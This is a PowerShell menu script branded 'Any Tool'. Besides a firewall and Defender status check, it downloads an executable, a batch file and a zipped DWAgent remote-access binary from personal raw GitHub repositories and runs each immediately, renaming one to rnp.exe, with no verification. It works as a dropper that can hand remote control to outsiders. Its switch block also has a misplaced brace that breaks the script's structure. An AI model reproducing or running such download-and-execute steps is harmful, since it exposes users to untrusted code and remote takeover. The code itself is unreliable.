
$ErrorActionPreference = 'Stop'

$workDir = Join-Path $env:TEMP 'AnyTool'

function Pause-Menu {
    Write-Host ""
    Read-Host "Press Enter to return to menu" | Out-Null
}

function Download-File {
    param(
        [Parameter(Mandatory)]
        [string]$Url,

        [Parameter(Mandatory)]
        [string]$Name
    )

    New-Item -ItemType Directory -Path $workDir -Force |
        Out-Null

    $path = Join-Path $workDir $Name

    Invoke-WebRequest -Uri $Url `
        -OutFile $path `
        -ErrorAction Stop

    return $path
}

function Open-DownloadedFile {
    param(
        [Parameter(Mandatory)]
        [string]$Path
    )

    if (-not (Test-Path -LiteralPath $Path)) {
        throw "File not found: $Path"
    }

    Start-Process explorer.exe `
        -ArgumentList "/select,`"$Path`""
}

function Show-Menu {
    while ($true) {
        Clear-Host

        Write-Host "========================================" -ForegroundColor Cyan
        Write-Host "                Any Tool" -ForegroundColor Yellow
        Write-Host "========================================" -ForegroundColor Cyan
        Write-Host ""

        Write-Host "[1] Windows Security / Firewall"
        Write-Host "[2] Download EI Application"
        Write-Host "[3] Download DE Script"
        Write-Host "[4] Download DWAgent"
        Write-Host ""
        Write-Host "[0] Exit & Cleanup" -ForegroundColor Red
        Write-Host ""

        $choice = Read-Host "Select an option"

        try {
            switch ($choice) {

                '1' {
                    Write-Host "`nWindows Firewall Status:" `
                        -ForegroundColor Cyan

                    Get-NetFirewallProfile |
                        Select-Object Name, Enabled |
                        Format-Table -AutoSize

                    Write-Host "`nMicrosoft Defender Status:" `
                        -ForegroundColor Cyan

                    Get-MpComputerStatus |
                        Select-Object RealTimeProtectionEnabled |
                        Format-Table -AutoSize

                    Pause-Menu
                }

                '2' {
                   $file = "$env:TEMP\rnp.exe"

    curl.exe -L "https://raw.githubusercontent.com/icic2k/icic2k/main/ei.exe" -o $file

    if (Test-Path $file) {
        Start-Process $file
    }

    Pause-Menu
}

                '3' {
    $batFile = "$env:TEMP\de.bat"

    curl.exe -L "https://raw.githubusercontent.com/suraj1863/itit2k/main/de.bat" -o $batFile

    if (Test-Path $batFile) {
        Start-Process cmd.exe -ArgumentList "/c `"$batFile`"" -Wait
    }

    Pause-Menu
}

                '4' {
    $zipFile = "$env:TEMP\dw.zip"

    curl.exe -L "https://raw.githubusercontent.com/suraj1863/itit2k/main/dwagent_x863.zip" -o $zipFile

    tar -xf $zipFile -C $env:TEMP

    $exe = "$env:TEMP\dwagent_x863.exe"

    if (Test-Path $exe) {
        Start-Process $exe
    }

    Pause-Menu
}
}

                '0' {
                    Write-Host "`nExiting Any Tool..." `
                        -ForegroundColor Cyan
                    return
                }

                default {
                    Write-Host "Invalid option." `
                        -ForegroundColor Red

                    Pause-Menu
                }
            }
        }
        catch {
            Write-Host "`nError: $($_.Exception.Message)" `
                -ForegroundColor Red

            Pause-Menu
        }
    }
}

try {
    Show-Menu
}
finally {
    Write-Host "`nCleaning temporary files..." `
        -ForegroundColor Cyan

    if (Test-Path -LiteralPath $workDir) {
        Remove-Item -LiteralPath $workDir `
            -Recurse -Force `
            -ErrorAction SilentlyContinue
    }

    Write-Host "Cleanup completed." `
        -ForegroundColor Green
}
